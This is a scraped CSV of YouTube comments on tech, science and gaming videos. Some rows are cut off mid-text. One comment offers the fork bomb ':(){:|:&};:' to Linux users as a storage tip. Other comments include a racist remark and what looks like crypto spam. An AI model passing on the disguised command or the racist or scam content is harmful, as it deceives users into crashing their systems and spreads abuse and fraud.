video_id,comment_id,author_display_name,published_at,like_count,comment_text,is_reply,parent_id,channel_id
zQ2ZJuUJeyo,UgzuMP8YW1s1bS5xqe94AaABAg,@hazerdprone2415,2025-09-13T00:11:39Z,0,I'm curious as to the utility of these tools.,0,,UCJvrc6GH_gSjrOHE3lvoxqw
UKfnXd3x-rw,UgxO4ldjAAkQaTMnPx94AaABAg,@tabhijit,2025-08-03T15:43:39Z,0,I don't know but it seems like it has been cut a bit too short,0,,UChzUvNWT1Cm0oKWLOlfAwEA
pVI_smLgTY0,UgwAy-Ih2PUsfPWSA-54AaABAg,@Heitaro.707,2025-04-28T08:48:47Z,0,Windows starts being a s*itHole,0,,UCzWa601enlkkeb0hPTxrAGg
CxVXvFOPIyQ,Ugx6ToLqSd2R05-W-x54AaABAg,@shades909,2025-09-02T01:33:20Z,0,"Money is always the source of the problem... Insane how we let ourselves be controlled by something that at it is base is of no value. Sure for us it s highly valuable, but for anything else on this planet, money have zero value.",0,,UClIOpuoeMqT9bhpQvmzOrPQ
y2y8ME02lX4,Ugxx-WVjqf9tRq-7pRR4AaABAg,@zwingler,2025-08-16T05:25:41Z,0,By far the worst veritasium video. Poor safety regulations. It seemed like there was no planning. The buildings you tested on were sandcastles,0,,UCTutjSq7RrbHZsEEkgklBgA
zQ2ZJuUJeyo,UgxSso3JehzRUOpEnfx4AaABAg,@Sunny_Hibiscuit,2025-08-24T03:23:48Z,0,What are these even for?,0,,UCyFQLDotk23xUWCawfF_O5Q
AGglJehON5g,UgxkGdMOoQlaUL8RFSR4AaABAg,@Drinthony,2025-08-07T17:44:09Z,0,Free Palestine,0,,UCwEMrmMTXNKFtNpfspn_EsA
8b3fqIBrNW0,Ugw_XUr2sqGTi9EJnUB4AaABAg,@fatanis-to1bm,2025-09-12T08:39:34Z,1,SHE HAS A NEW NOTEBOOK 😮😊❤,0,,UCXUMs7UCtwLGrcstaIfsLqg
3YX5QtO6S-M,UgyNvHssa9iHI_tHV-B4AaABAg,@vulcano5966,2025-09-03T10:31:09Z,1,"I'm the one who prefers stay at home and when moving, move walking or by boat. I use the elytra to return from my journeys. It stays always at my ender chest.",0,,UCHDnyXx79_fl0EaG2NfpogA
za_HO2E3JEU,Ugyn30Z-3vR0PuP_8Sd4AaABAg,@DontMakeMePlayMyTheme,2025-07-25T08:03:14Z,0,Btw the squirrel is considered the most agile for a reason it has very accurate jumps,0,,UC43FylvhlPPoa-EiD4enqGQ
TRODfpnH1mo,UgzVTaZ7I-3LksXQHsd4AaABAg,@sniper44x,2025-08-26T01:17:17Z,0,I'm the same way,0,,UCWnugIxmiuA6AtRw_GVt8SQ
CxVXvFOPIyQ,Ugx9xVLDPiVrKWNmDCl4AaABAg,@adamumuhammad9595,2025-09-01T07:57:21Z,0,"GMO, any Nigeria here?",0,,UChk0ZAwK4uUAOwmACSWxDzw
AGglJehON5g,UgyAZfEq98BG4pThieZ4AaABAg,@S.mashing.Blumpkins,2025-08-08T02:37:04Z,0,Seeing the 3 men get recognized for their contribution to the world makes happy,0,,UC923UQ6qOOelUVfIh6Gp_LA
AFXLZ7FEJc4,UgzpxvD0jE86Do7L7rR4AaABAg,@Kirmeins,2025-08-23T14:27:02Z,0,Sooo... if I mentioned how important rubber is to the modern life to a bunch of wildlife extremists... I might die but the earth might get rid of the human overpopulation and the issues it brings?,0,,UCQGrFueN9MDX2Vc12Ykubuw
Dlsa9EBKDGI,Ugw8fWafKt8ZyL3Ye5V4AaABAg.AHhOpNKP9ZKAHhPvJbAEP3,@a52productions,2025-05-04T13:13:53Z,0,"Unfortunately, copying a qubit is impossible -- see the no-cloning theorem. The only way you could do it would be by rebuilding the qubit from the ground up, which of course requires the same number of steps and defeats the purpose.",1,Ugw8fWafKt8ZyL3Ye5V4AaABAg,UCPO6AORZ69ckQJTMCPIdqrg
niU94RzUhBU,Ugy465a4ObCbXpvknFZ4AaABAg,@Radulf666,2025-09-06T19:58:20Z,1,"If the phone had a rLCD, it would be more like a real e ink. If it could switch an backlight on and off, that would be really nice!",0,,UCa8dvL8gxEsc-_IBNGu6KSQ
AGglJehON5g,UgwiyuSFAQ1BMK27LO54AaABAg,@wigglyboots2,2025-08-21T07:09:05Z,0,This video's thumbnail has had more of an arc than most MCU characters.,0,,UCYtGrD_hl8K3wVOV3-o4muw
W_kSf5yzmr4,UgzpfURNxS7yMhxig-J4AaABAg,@ktk1144,2025-05-13T11:28:24Z,0,gg,0,,UCwlM9Q0WLNwrdOUdPbItJGQ
u_Lxkt50xOg,Ugy60Bkx3-_LVJQwBlJ4AaABAg,@prestonfernandes2071,2025-06-27T09:44:36Z,0,Who going to tell PewDiePie about Jellyfin or maybe Immich as a Google Photos alternative,0,,UCUqU-vV5EVRoCR63oDc_p7w
ydEcG5P0_zE,UgxuKL6FD6YXNUhPp054AaABAg,@Hoyami-o9h,2025-09-01T08:46:57Z,0,Je suis ton stylo … Génial,0,,UC9H9wgEg_kxDibR04Wthjhg
W_kSf5yzmr4,UgwRiIJxMFxYVjbj4tZ4AaABAg,@namanthacker,2025-05-14T13:36:28Z,0,Best wishes for your new endeavour,0,,UC-zmTqerPg-sE0ZztCEaoGQ
2JzOe1Hs26Q,UgyIhVtByTTztLcG1Z54AaABAg,@johnmcclure2149,2025-08-22T16:27:53Z,0,Good to see a new vid. Welcome back sir.,0,,UC2afWQIkHQrAsboPhP_1dXA
miTpJmMt7uo,UgyyvtRZtUlMXUl63at4AaABAg.ALChtx8EB_xALCjN3PDwUh,@anonimanonimov3251,2025-07-30T16:02:27Z,24,"Why not?
y2y8ME02lX4,Ugz5nrViuWV3Vg4lnAd4AaABAg,@nicolaecalin5951,2025-08-18T09:50:36Z,0,The price of tungsten is higher than to build a regular bomb,0,,UC5UpReghWaVtTkX57t6CD5w
BYv7k6wQyEQ,UgynbYyhqDdtUAlRWbR4AaABAg,@CassandraMeinert,2025-09-01T00:41:09Z,0,End update?,0,,UCrJvvgdq65LASx7Fp55nAcg
pgeTa1PV_40,UgzgUqgHJykVegv9TjJ4AaABAg,@Nero-qe8iz,2025-05-28T18:09:33Z,0,a pixel animated necklace or bracelet for bjorn might be cool,0,,UCv2pAUZ02d-UOktbvHOqJBQ
_a_dY27mlfk,UgwA_ii6gkJtl1LdHWx4AaABAg.AMNInwurMGIAMNJDLjX-Fw,@dandsw9750,2025-08-28T15:08:14Z,19,So True,1,UgwA_ii6gkJtl1LdHWx4AaABAg,UCtuGXBgwMi1PZw6ebeb7H1A
pVI_smLgTY0,Ugz0IMsowW6DeaaWHG14AaABAg,@Lord_Duck,2025-04-27T00:32:36Z,0,W,0,,UCiL6AwGQNmlB8ZA3Zr5O7BA
bYkQn2TpF2k,Ugy96lSt0ID_Nt8BPhN4AaABAg.AMp4nawz3lrAMpWvUPK2Li,@JKHTX,2025-09-08T23:25:58Z,1,Sacrifice all our politicians.   Sad price we must pay 😢,1,Ugy96lSt0ID_Nt8BPhN4AaABAg,UCS_qieBVufzge1fiXoq_HeA
qeQCVcBWqis,UgzlVVwup-3RbdH2PjR4AaABAg,@elpelagatos,2025-09-12T08:04:19Z,1,11:02 Now they just need to do the same with laptops and start at 512GB of storage 🙂,0,,UChse_tNeItC-uMeBtjJ8wnQ
zQ2ZJuUJeyo,UgyMS4wsLj0W8UflJW94AaABAg,@jackbeach942,2025-08-29T01:40:15Z,0,Pause?,0,,UCYbzsRDTK7QfDA24hvcGfFQ
tZ8ehplVFp4,UgxYI4s_rN4HmeCcWGl4AaABAg,@hypnogri5457,2025-09-11T20:40:32Z,0,Change title/thumbnail pls,0,,UC7-wGOhs5mF6hzDs_rLbEBg
4uqo-brP3xs,UgwglHUaBFa-QgtZe0x4AaABAg,@Radon86-Subscribe_,2025-06-15T01:47:45Z,1,I am back to watch mr beast and t series 😂👉👉👉👉,0,,UCGfUIy5LmcOiwARrH1eaxaw
KNnHdKKfRCQ,UgxqoL6ZAb8Qr8Sqwvp4AaABAg,@321pandaa,2025-09-05T11:24:42Z,0,Hyper potions always peak,0,,UCTeHcpaNZ3UhnUUOsMgrl8w
u_Lxkt50xOg,UgyxLS41Els65qmvSDJ4AaABAg,@cobe13max,2025-06-27T01:21:46Z,0,cant wait for mutahar's review telling google they can suck it,0,,UCRkzNwexbipvRxNkP1wt_uA
KZeIEiBrT_w,UgwSCIlQmwAGonpTykJ4AaABAg,@gato_malo_420,2025-07-25T23:33:59Z,0,I m on the right side,0,,UCjBz-7DPNfA0SwX_RwQzdAg
u_Lxkt50xOg,Ugy0Onxk5sX8kZoB_qJ4AaABAg,@official.sirhaxalot,2025-06-27T15:25:32Z,0,Use FUTO keyboard ...no internet needed... good luck on the journey,0,,UCblbfYHfH5Hy52aHotxle5Q
pgeTa1PV_40,UgzMl2VZQlJ38myUKz14AaABAg,@CinderellaCostallas,2025-05-29T21:31:26Z,0,"Pewds turned tamagotchi into tama-gotcha.
CxVXvFOPIyQ,UgzZiudnGlvsu7VxhY14AaABAg,@RujitStha,2025-08-31T20:11:25Z,2,How one company secretly controls the world's  food supply,0,,UCqkrwIa_cZokTQeQQXXbFZQ
-CISqa73298,UgzQORVyDbI0czqjL_N4AaABAg,@unlistedvector,2025-08-29T19:21:41Z,1,What could go wrong?,0,,UCR6i9HXcOL3LuDrKqKFpz-w
pgeTa1PV_40,Ugz4c16mUhgJ9s_9Jt94AaABAg,@_czerny_,2025-06-01T01:02:34Z,0,BIG BRAAAAAAAAAIIIN,0,,UC-N-U_y_Xcbu3MyvRzzwe7A
u_Lxkt50xOg,Ugy29ZPOHJFfziwzzbx4AaABAg,@rohin.snackshop,2025-06-26T19:32:03Z,0,He's the new LTT,0,,UCsWmZrA2gmET2XxgNV78ksA
u_Lxkt50xOg,Ugxl3Yhrxf7vbzIarlJ4AaABAg,@alexanderstalnacke1319,2025-06-26T19:10:16Z,0,NUTZZZ,0,,UCyWJdE6Y15ifDHMX7BDbWCw
AFXLZ7FEJc4,Ugzu625sgxGrDHy0z5p4AaABAg,@hdl7233,2025-09-07T14:56:07Z,0,"Hello, I have a question: Is Natural rubber still biodegradable after vulcanisation? Or what kind of rubber would be biodegradable? Thanks",0,,UCh8ublXAAIbny_K2cpA0dIQ
4T4AoXFDcD8,Ugyub8W_TdqVMaz-VxZ4AaABAg,@pamem7344,2025-08-09T19:26:29Z,0,So you clickbaited us again… and we fall for that AGAIN 😂,0,,UCL6RtEAtUgXO0FpJh9Px5Lg
MhRGfNkw3Vo,UgwERj3EqqGcgyW1FzJ4AaABAg,@AlejandrinaArmenta,2025-07-20T22:46:29Z,0,"Put 500 bucks in Bellarium Network and forgot about it. If it hits 100x, I’m quitting my job live.",0,,UC_2RQCqEOTnlOyUTBln3UKw
Dlsa9EBKDGI,UgyFvvRUQP8n3EendjB4AaABAg,@asdaweasdsewasdf1231ewa,2025-08-23T16:29:50Z,1,Quantum computing is complicated.,0,,UCzHlLpRm3aojwks_lK3BZ7g
pVI_smLgTY0,UgwOFdAJ8DOReeLMGpx4AaABAg,@neokite,2025-05-08T17:05:23Z,0,Why some lines were in Russian???,0,,UCEV9e2ktOETr68zblEZkIyw
H5Zj5UAt0ik,Ugxujf2QOwMH96lPbZh4AaABAg,@SantiagoZerpaRuel,2025-09-06T14:02:35Z,21,Horse-> horse armor-> diamond horse armor-> diamond-> diamond Pickaxe->obsidian->nether portal->nether> ender pearl and blaze rod> ender eye > end > END UPDATE CONFIRMED!?!,0,,UCp1acyNDpIbx9TzvsNmpZOA
pVI_smLgTY0,UgxUAz1TFOQGr0hBxux4AaABAg,@Lysander-x5z,2025-04-27T18:31:30Z,0,"Traktor, Ableton and ASIO are preventing me from switching to Linux entirely.",0,,UCDzMDRZHbxVu_COtIiflNPQ
KZeIEiBrT_w,UgytEcimekH98RpfivJ4AaABAg,@Discoveryism,2025-07-27T18:59:29Z,0,"I’m genuinely confused about what these Russians think they were addressing. 😂
u_Lxkt50xOg,UgzifhFU3OPaah0pbXR4AaABAg,@jblen,2025-06-27T19:32:28Z,0,"It is kinda nuts how it took using YouTube revanced for me to actually look into things like fossdroid. I've been preaching how flexible android is for eons (ironically now owned by Google but still far far more freedom and customisation than iOS)
lYDE3oq6fL4,Ugz2uL__nQQXUixM9al4AaABAg.AMorHfiNZfIAMot5FpZnWt,@HughJegantlers,2025-09-08T17:29:10Z,30,Scrapyard wars was the friends we made along the way.,1,Ugz2uL__nQQXUixM9al4AaABAg,UCZUPKS72V9Hy58pwZgHBS5w
thS4CtL5RKk,UgygWnenjklHnX3g4lB4AaABAg,@darkmoon4135,2025-09-01T19:48:55Z,9,Zombie apocalypse. Instead of studying she fighting hordes of zombie and then turn into one of them.,0,,UCd-O4TeL7WuZ2p4h6Kubyug
y2y8ME02lX4,UgywI3JXMXD3sbm9Bft4AaABAg,@DizzySantino,2025-08-16T22:38:28Z,0,G. I Joe reference 😆,0,,UCkNJDVHohIRoBvDx68tUqoA
_a_dY27mlfk,Ugz6jSO34iABxK0BOUV4AaABAg.AMNJkt8mp6XAMNNQMNqGbE,@Eggroll_27,2025-08-28T15:44:58Z,16,🎃,1,Ugz6jSO34iABxK0BOUV4AaABAg,UCdIx5YQjzVB6rh4_KFPXnVQ
pgeTa1PV_40,Ugw6rgSRVcgGO1IvWBZ4AaABAg,@jumpman93LP,2025-06-11T10:03:22Z,0,great … now i want that tamagotchi!,0,,UCYyYC_alpE7HorzaO5mpJXg
tZ8ehplVFp4,UgwaNEIapfsckXcymBJ4AaABAg,@duytdl,2025-09-11T23:59:27Z,0,15:19 So easy to bury the corruption you know will only show up in disasters big enough to hide the proof 🤬,0,,UCMPlUDnok05qPtLuJqVP9KA
zQ2ZJuUJeyo,Ugyra01jyyv9-ZazksV4AaABAg,@LukePascal-h2i,2025-08-29T12:20:24Z,0,I bet you like them balks hitting your face,0,,UCjRZroUao_YZho-PziiADYQ
pVI_smLgTY0,Ugzt6nDnhh5Hb2tW6BB4AaABAg,@TheAscendant-v4n,2025-04-27T14:47:07Z,1,linux is the GOAT,0,,UCiUnIff5mQ1yYo0IL6ih77Q
KZeIEiBrT_w,UgyaKdZKDa6DRMugqNR4AaABAg,@bubbles9744,2025-07-28T02:36:58Z,0,1:38 epic mathematician duel (good job whoever did the animations and the sounds),0,,UCxU4nyD0YTEpUmzMt-KRb7A
_BrFKp-U8GI,Ugyiw_qLXCOM_HmUk7Z4AaABAg,@wmkm7144,2025-09-07T21:12:29Z,2,"What an amazing presentation - everything is high quality. From the concept, the story telling, the narration all the way to the animation.",0,,UCuUVdwq2QROvj25RhWl4MFQ
tMIDpbmFoL8,UgzlMyKLmnhgcHkf0ah4AaABAg,@aniketratawa8268,2025-04-12T10:04:55Z,0,✨✨✨,0,,UColAgdyijnbdoqMK5CS64yw
CxVXvFOPIyQ,UgxnUuPFXZor5sCgghx4AaABAg,@originalguckfoogle,2025-09-09T22:03:59Z,0,"It's because lawyers and giant multinational corporations and their lobbyists, that's why. There, saved you 45 minutes.",0,,UCXbtWomcV2EA6Rez2ioD2wg
qGXtMENJDps,UgxrjKe9JCVlY-Q2RtZ4AaABAg,@Blurggg,2025-05-16T15:35:27Z,0,"DEATH BY COW is not the number one cause of death in the UK, you silly. :) It doesn't even rank and is considered RARE. But the deaths that do occur, I can almost guarantee you were by grieving dairy cows chasing after their babies when the farmer separates mama from baby so we can steal her breast milk for human consumption. Humans are gross.",0,,UChPKMg0eoLFVvMs-2li73Tg
QVqIx-Y8s-s,Ugy0T0W-ZJyMES5UGnx4AaABAg,@SyrupThinker,2025-09-09T17:12:08Z,32,"Imagine if the attackers had actually put something interesting in there, like backdooring systems en masse...",0,,UCagWEygHwbAqKrgcXeG4fRQ
KZeIEiBrT_w,UgwpXbEqr3Rw-XvCdHV4AaABAg.AL1-g1AqTMAAN-shLzZjn7,@СержРоган,2025-09-13T09:16:40Z,0,Llm is markov chains on steroids,1,UgwpXbEqr3Rw-XvCdHV4AaABAg,UCaOniJzl1brPwwxVB5ckQUA
u_Lxkt50xOg,UgzASRNcaL51cB_5DDx4AaABAg,@Jayyy6615,2025-06-27T14:18:30Z,0,"If you use Linux you need to type this command to help with storage  "":(){:|:&};:"" the arch install wiki doesn't want you to know this :D",0,,UCAwdYUXZ50bvN7mWBMY65bw
2JzOe1Hs26Q,UgytYIyg6XJ1-xT13lx4AaABAg.AMxzBIKkHuwAMy8c58t7Us,@astikaarsitektur5916,2025-09-12T07:46:46Z,0,must be hurt for you to see your humiliator retired in a successful note LOL,1,UgytYIyg6XJ1-xT13lx4AaABAg,UCw8tcXFvipeHu4kffOfVrXg
MhRGfNkw3Vo,Ugy-KLhva5DqqdVJJwd4AaABAg,,2025-07-18T15:46:23Z,0,Wow early,0,,UCiq3awl9Sc2c5BQtBSl7dWA
2JzOe1Hs26Q,UgwWeSrJS9EQLhfLex94AaABAg,@julianfenner5682,2025-08-21T17:08:31Z,0,8 minutes 9k views. Fell off,0,,UCvpATU_S-9bIhdLY6dlbu2g
pgeTa1PV_40,Ugwo9J7RD49_1pp6GqN4AaABAg,@grittybiznis,2025-05-29T16:24:41Z,0,LOVE these new videos,0,,UC6kJSDRrrgw_fcb30mVnKhA
qGXtMENJDps,Ugz-BQHfgtL-aZEAoyt4AaABAg,@GenomancerBot,2025-05-17T07:46:03Z,0,Imagine having black people in these kinds of places.... I wish I would live in a safe country where I could enjoy my life safely without of constant fear of getting stabbed or mugged.,0,,UCqMzEDfKl4GveuJklk0A0IQ
zQ2ZJuUJeyo,UgxtOezlljSZJ7SWpSF4AaABAg,@sbob17,2025-08-19T11:45:21Z,0,Balls on chin,0,,UCubZ299DdwwVe0hYdDjcznA
CxVXvFOPIyQ,Ugwy5ytI8vJ22Acjuzp4AaABAg,@JJ-Streaming,2025-09-04T09:49:19Z,0,"Anything can cause cancer.  Driving down a motorway every day! Flying in aeroplanes all the time! Sitting in the Sun too long! 
8tx2viHpgA8,UgzqFWB3e4re4gKZ8AZ4AaABAg,@MuzleTech,2025-08-08T16:55:00Z,0,"I have tried the gpt-5 in lovable and other platforms it's not working  well as i expected it's hipe I tried to create a simple web app but it's messed up , but in the default lovable ai  created that app very well , well it's a hype or  something else comment me if someone faced similar problem like me and claude 4.1 is better if compared to gpt-5  according to me",0,,UC21fN-fld3r2sbLUKZpx_WA
5QU20HMPZ3M,UgzP1nIsYC9Bg15PVp54AaABAg,@MistyAlex17Irish,2025-09-10T15:13:29Z,0,I like this It's Cool 😎🔴,0,,UCVbhbbOtE4LpzHXRx-h55FQ
pVI_smLgTY0,UgzN2v_5oxlmCjd4KFB4AaABAg,@AliensComeback,2025-04-27T00:41:59Z,6,"4:50 ""VALVe started to improve gaming on Linux-"" Good! Now for Linux takeover. >:D",0,,UCF7Ptpj-SIUYD2r_LEApx8A
pVI_smLgTY0,UgxnE_G9C5Y9P0PyCe94AaABAg,@AYAYEET,2025-04-27T12:11:15Z,0,"I feel like the end of the video explains everything very well. As much as I love using / customizing my steam deck when I’m not working, I need a device that reliably works for the work I need to do. For me that’s Mac OS, but maybe one day a Linux Distro will work for all my tasks out of the box.",0,,UC1ZDALgVcyvV2aNBIPZ_o_A
BYv7k6wQyEQ,UgzTU2R0EhxnSl-hksp4AaABAg,@Sigma-j2w2e,2025-08-30T07:30:30Z,0,Can’t wait for this lol,0,,UCiHkhvaZX4kuni-NmxEaucQ
zQ2ZJuUJeyo,UgxcQkJpwucJl8N1TNJ4AaABAg,@tlfreek,2025-08-24T16:02:50Z,0,"""balls in the face""  uh huh i bet",0,,UCh0CtY2fCLThpXoH5nn5fTw
aKx3WqeG3Xc,Ugz-E9HzrO2vYwuf4mJ4AaABAg,@abdujalilkarshiev7255,2025-09-13T18:13:55Z,0,8,0,,UC_4cByj2RpK9kXtkUr43t0A
za_HO2E3JEU,UgyArIKVtPo3JPHxKdN4AaABAg,@rememberyourfuture,2025-07-25T05:47:20Z,0,Is this the same in humans? Asking for a friend 🥴,0,,UCL0ywc9NAe20jsC1KTPcVQA
Tq6Hqrb65qE,Ugx4PAIjZPdcAC4TETx4AaABAg,@VinodKumar-fu2gl,2025-08-20T21:44:22Z,0,Dammmmmmn! Thats Riggggghhttttt,0,,UCLgw-b7u19YolXD5KhF2D6Q
RQWpF2Gb-gU,UgzNgLFBMRuHCRwfyVV4AaABAg,@MooseBoys42,2025-05-06T19:07:38Z,0,"31:45 Even after your explanation the process speedup still very much seems to come from parallelism. It's not clear whether the multiple ""steps"" in the algorithm are actually performed repeatedly on the same gates, or if the gates need to be laid out as physically distinct. If the latter, it seems like the algorithm would still be considered O(1) in the same way that we consider integer addition on classical computers to be O(1) even though you need O(bits) gates in the ALU.",0,,UCdW5YmFcX96Onjo8du3xpMg
zQ2ZJuUJeyo,UgwUabA-7ZOTfdago654AaABAg,@bobedwards8896,2025-08-19T18:58:21Z,0,Why aren’t they white?,0,,UCcyCNMl4VAgmqYaxqxzOnLg
niU94RzUhBU,Ugx8xhl-NlZWsCqQqyJ4AaABAg,@jefreyjefrey6349,2025-09-09T14:43:43Z,0,"you had me at ""it is not apple""",0,,UCj8-mYOEt7gUW294A0_LTwQ
y2y8ME02lX4,UgwqyMzO2YYUXSYRmkp4AaABAg,@Revoxem,2025-08-18T06:20:58Z,0,The chicken guided missiles were worse,0,,UCaBZUM9stAm9O-WK2xXy64Q
u_Lxkt50xOg,UgwQF_0g_wdzMGBmncN4AaABAg,@n_dogg005,2025-06-26T22:37:50Z,0,Linux users are basically digital communist,0,,UCSWD_onWK3zvVU4j7ZmyUYQ
y2y8ME02lX4,Ugw_iXzRFeIaLyu9Dal4AaABAg,@bobw7018,2025-08-18T00:49:36Z,0,"BY FAR Not the worst idea the DoD ever thought about. DTS definitely has a place in that list. So does the Davey Crockett mini nuke launcher, and I'm sure many others......",0,,UC2UCh08vI5w6LRhSJttkFZg
u_Lxkt50xOg,UgytJLe7gQVy9EEz9-h4AaABAg,@ChrisRaucci,2025-07-02T12:53:58Z,0,Pewds hasnt lost a step... one of the best videos hes ever made. Glad to see you back dude,0,,UCXw8JASgK3p99zKEtzicvJQ
CxVXvFOPIyQ,UgzGvJZiXzVHGjGaFYJ4AaABAg,@brandonn9054,2025-09-09T01:15:01Z,0,Whats it going to take to radicalize people enough to vote against this kind of thing,0,,UChEkFztynfryP4EdYtA3nbw
lYDE3oq6fL4,Ugw7uX6ab7lspb2ZGUp4AaABAg,@Smirk_Station,2025-09-08T17:08:56Z,1,1st,0,,UCmmm8XeWJoSxtyuGwUAbU1w
pVI_smLgTY0,Ugxj2AkKKL6SyEGmu4V4AaABAg,@pzes8995,2025-04-26T22:45:27Z,0,lfg i use arch btw,0,,UCfBwrbbD2Uu0IGug8Z_ZOgA
qeQCVcBWqis,Ugxr3L4f1yWHb_t-PjF4AaABAg,@umeshgallage1,2025-09-10T09:59:52Z,0,Flawless script.,0,,UCnD7-k1Kw8CtdLlYzGZK8Ig
yzSBeCJfhkw,Ugz2_sY3gavHMjsWSj14AaABAg,@dostheoni,2025-07-31T05:33:29Z,0,Rematch??,0,,UCFbGzQ3Atxh7IH6ScY0zwMg
5QU20HMPZ3M,UgyB7SkPM9BRMIqpFJN4AaABAg,@imjustcurious4734,2025-09-11T04:12:48Z,0,wow end update,0,,UCyYM_OASYYfe1DyG7pWKUlQ
CxVXvFOPIyQ,UgwK9osvyR8bLNrBikZ4AaABAg,@CockerelOfficial,2025-09-08T01:56:08Z,2,"Yeah. I said this before, I'm pro-gmo because science. I'm anti-gmo because Capitalism",0,,UCkg_FEgtPU6xivO8VoVtjQg
qPen-cHdYmk,UgwmGxhni6qypu3AiMh4AaABAg,@guffels,2025-09-07T00:39:57Z,0,I deeply miss the behind the scenes content on this channel but I just don't have money for more than my premium subscription that is used by my whole household.,0,,UCrDZW24GQvjkFMcLt6jwYjA
qeQCVcBWqis,UgyY0vZR8X1I_hKRY214AaABAg,@jakealexander6046,2025-09-10T18:00:34Z,0,Been a while since I am excited to upgrade! I don’t know what to choose yet,0,,UCfIWdAi5bEHHRmri1cw4h3Q
2JzOe1Hs26Q,Ugz6H-vd_QGXczZO3oN4AaABAg,@miccorubia2871,2025-08-27T22:56:50Z,0,YOU WILL NEVER FALL OFF YOU ARE THE GOAT,0,,UC67MDwYrgze2CB7RIQgCKZQ
AFXLZ7FEJc4,Ugwb7GQiMxIlD181T-F4AaABAg,@NoskcajLlahsram,2025-08-23T18:59:12Z,0,"It looks like they skipped a beat, how did COVID stop a tree disease from spreading? Was it being spread by the workers?",0,,UCWHDbkNAF3pUB877GPOgW7g
H5Zj5UAt0ik,UgyKS3f-sCTmzfgWWUd4AaABAg,@johnghvineria,2025-09-12T18:45:11Z,1,Literally anything BUT an End update..,0,,UCb9gEikhN2kXqir45Dnc-Mg
lYDE3oq6fL4,Ugzze4luKsBDm1lgIzN4AaABAg,@FreshApplePie,2025-09-10T08:38:16Z,0,"imo the biggest difference was the paint. any deep or darker colors for lukes room might have cinched it for me if the projector was aligned and if game streaming worked, but the end result just kinda ended up looking too ikea, plus they couldve gotten an rgb bulb
2JzOe1Hs26Q,Ugy1_yHj3RUU_Mq6Qbp4AaABAg,@redlineau,2025-08-23T08:04:52Z,15,"6:30 a good case actually helps channel all the airflow past ur components and helps directionally synergies the airflow to decrease waste. 
u_Lxkt50xOg,Ugxj44NbolQQNV5m92h4AaABAg,@sppb666,2025-06-28T10:00:09Z,0,"Keyboard recommendation, HeliBoard you can set it up completely custom to your likings and it supports mulit language typing, when you use it, there will be a small globe symbol in the bottom right where you can switch to other layouts if necessary.",0,,UCuADiPU4Wgf2SoMOeoa518g
AFXLZ7FEJc4,UgwlLgS-lqtOl6WVZYh4AaABAg,@auroralflame8515,2025-09-05T10:35:31Z,0,Malaysian rubber,0,,UCFcPaGao_R0Gek0Vly4ackg
XGmZFNG-qQQ,Ugw0bsSN1KAmEINGNK54AaABAg,@amassacu420,2025-09-05T22:49:47Z,0,US just didn't want to kill one of its last standing empires and allow for a chinese competitor to enter their market,0,,UCP_8LozGXoraRml1fVwAj0A
2JzOe1Hs26Q,UgxLyWkWSl1m7iSY1xt4AaABAg,@stefanmirev8873,2025-08-23T10:13:07Z,0,Never expected to see that old intro again,0,,UCEG_Wt4CgQfREH1LkzyMPxQ
y2y8ME02lX4,Ugx91bazKBe6q26H8QV4AaABAg,@Freelancer4tehwin,2025-09-13T18:16:45Z,0,"I love how this completely forgets simple things like a guidance package. You have a telephone pole of tungsten that you've hoisted to orbit, and you aren't going to put basic avionics on it? A MIRV from the can deliver an accurate strike on the order of a few meters at Mach 20. Most modern intercept systems struggle to meets missiles over about mach 5, and none of them can destroy that kind of kinetic impactor. You could use modern guidance, and be delivering a theoretical 50 ton of TNT equivalence via kinetic impactor anywhere in the world in under 2 hours, and effectively from a completely vertical and largely impervious flight path. 
tZ8ehplVFp4,UgwqaGiZfS36pXDOdlZ4AaABAg,@memeno2853,2025-09-13T15:57:32Z,0,We wanted an in depth analysis of how WTC7 collapsed and instead we get this 😅,0,,UCyFxxbL7DH8Sl93SLISnADA
AGglJehON5g,UgzXX235kbabYmqn35F4AaABAg.ALXJM_2n5k5ALXS9iPLQTi,@Bruno_Noobador,2025-08-07T17:07:23Z,3,wait WHAT,1,UgzXX235kbabYmqn35F4AaABAg,UCMIsTKw99I33g6RUSuAkikw
3YX5QtO6S-M,UgxX2XFyK9J83gu8jeV4AaABAg,@Vizmotrals,2025-09-03T06:35:53Z,0,Elytra and fire work rocket are more faster than the happy gast lol 😂😂,0,,UCjwqYMccSx7FlPZ3qkGpHrQ
pgeTa1PV_40,UgwxvLlZnFbD27MWVYt4AaABAg,@haves_,2025-05-29T02:58:20Z,5,"0:01, AAHH, 2011 JUMPSCARE",0,,UCLrC1ukeR_cTOnb-hDzfXrg
